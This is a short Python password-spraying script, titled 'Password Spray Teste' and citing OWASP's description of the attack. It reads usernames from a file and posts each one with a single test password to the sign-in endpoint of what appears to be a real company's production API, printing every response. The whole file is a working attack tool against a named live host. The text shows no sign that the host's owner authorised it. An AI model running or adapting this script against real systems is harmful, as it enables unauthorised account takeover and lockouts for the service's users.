#!/usr/bin/python3

import requests
import json
from pyfiglet import Figlet

desenho  = Figlet(font='eftiwall')
banner_desenho = desenho.renderText('rtz')
fonte = Figlet(font='digital')
banner_fonte = fonte.renderText('Password Spray Teste')

print(banner_desenho)
print(banner_fonte)
print('Create By: Carine Constantino\n') 
print('carine.constantino@hotmail.com')
print('----------------------------------------------------')
print('OWASP: https://owasp.org/www-community/attacks/Password_Spraying_Attack')
print('----------------------------------------------------')

def attack():
    try:
        list_files = 'PATH TO USER-LIST'
        open_file = open(list_files,'r')
        for linha in open_file.readlines():
            url = linha.strip('\n')
            api = 'https://nexthub-api.mobly.com.br/auth/signIn'
            headers = {'X-Api-Key': 'YOUR AUTHENTICATION TOKEN','Content-Type': 'application/json'}
            payload = json.dumps({'username': linha,'password': 'YOUR PASSWORD TEST'})	
            req = requests.request(method='POST', url=api, headers=headers, data=payload)
            print('--------------------------------------------')
            print('Target: ', api)
            print('Username: ', linha)
            print('Resultado: ', req.text, 'HTTP Status: ', req.status_code)
    except ConnectionError as exc:
        raise RuntimeError('Fail') from exc
        
       
attack()
